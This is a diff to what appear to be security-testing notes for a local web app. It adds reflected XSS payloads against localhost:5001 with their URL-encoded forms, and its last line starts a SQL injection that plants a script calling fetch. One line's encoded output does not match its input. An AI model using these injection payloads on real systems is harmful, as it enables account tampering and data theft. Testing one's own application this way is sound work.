@@ -149,6 +149,26 @@ test:
 <script>document.title="B1-REFLECTED-XSS";</script>
 -> %3Cscript%3Edocument.title%3D%22B1-REFLECTED-XSS%22%3B%3C%2Fscript%3E
 
+http://localhost:5001/search?q=%3Cscript%3Edocument.title%3D%22B1-REFLECTED-XSS%22%3B%3C%2Fscript%3E
+http%3A%2F%2Flocalhost%3A5001%2Fsearch%3Fq%3D%253Cscript%253Edocument.title%253D%2522B1-REFLECTED-XSS%2522%253B%253C%252Fscript%253E
+
+
+==================================
+
+<script>document.title="B1-REFLECTED-XSS"</script>
+
+encodeURIComponent('<script>document.title("B1-Reflected-XSS")</script>')
+
+=> %3Cscript%3Edocument.title%3D%22B1-Reflected-XSS%22%3C%2Fscript%3E
+
+http://localhost:5001/search?q=%3Cscript%3Edocument.title%3D%22B1-Reflected-XSS%22%3C%2Fscript%3E
+
+encodeURIComponent('http://localhost:5001/search?q=%3Cscript%3Edocument.title%3D%22B1-Reflected-XSS%22%3C%2Fscript%3E')
+
+=> http%3A%2F%2Flocalhost%3A5001%2Fsearch%3Fq%3D%253Cscript%253Edocument.title%253D%2522B1-Reflected-XSS%2522%253C%252Fscript%253E
+
+==================================
+
 fit-nabila-17'; update membership set last_name = concat(
     '<script>
         fetch("http://localhost:5001/reply", 
